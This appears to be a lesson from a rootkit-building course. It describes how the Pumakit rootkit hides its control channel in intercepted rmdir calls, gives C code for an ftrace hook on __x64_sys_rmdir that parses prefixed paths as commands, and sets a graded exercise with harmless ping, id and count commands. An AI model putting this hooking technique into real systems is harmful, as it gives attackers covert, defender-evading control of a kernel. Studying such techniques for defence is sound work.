# Ling 34: rmdir trigger

Pumakit controls its rootkit with `rmdir`. The operator types
`rmdir("/tmp/zarya.0")` and the module intercepts it, parses the path
as a command, and acts. The directory is never removed. Defenders
watch `kill` signals (Diamorphine made that famous). Nobody watches
`rmdir`.

## The pattern

Hook `__x64_sys_rmdir` with ftrace (same pattern as ling 33). Extract
the path argument from the register state. If it starts with your
prefix, parse the command and return success without calling the
original. If not, pass through.

```c
// inside the hook:
const char *path = /* extracted from regs */;
if (strncmp(path, PREFIX, sizeof(PREFIX) - 1) == 0) {
    const char *cmd = path + sizeof(PREFIX) - 1;
    dispatch(cmd);
    regs_set_return_value(regs, 0);
    return;
}
orig_rmdir(regs);
```

## Getting the path from userspace

The path argument to rmdir is a userspace pointer. Use `strncpy_from_user`
to copy it into a kernel buffer before comparing:

```c
char kpath[128];
const char __user *upath = (const char __user *)regs->di;
long len = strncpy_from_user(kpath, upath, sizeof(kpath));
if (len <= 0)
    return orig_rmdir(regs);
```

## What to build

Hook `__x64_sys_rmdir`. Recognize three commands:

```
rmdir /tmp/.rk-ping     → pr_info("pong\n")
rmdir /tmp/.rk-id       → pr_info the uid of the calling process
rmdir /tmp/.rk-count    → pr_info a counter that increments each call
```

Any other path passes through to the real rmdir.

## Contract

The check script verifies:

- `rmdir /tmp/.rk-ping` succeeds and "pong" appears in dmesg.
- `rmdir /tmp/.rk-id` succeeds and "uid=0" appears in dmesg.
- `rmdir /tmp/.rk-count` three times produces count 1, 2, 3 in dmesg.
- `rmdir /tmp/real-dir` still works normally (directory is removed).
- After unload, rmdir behaves normally.
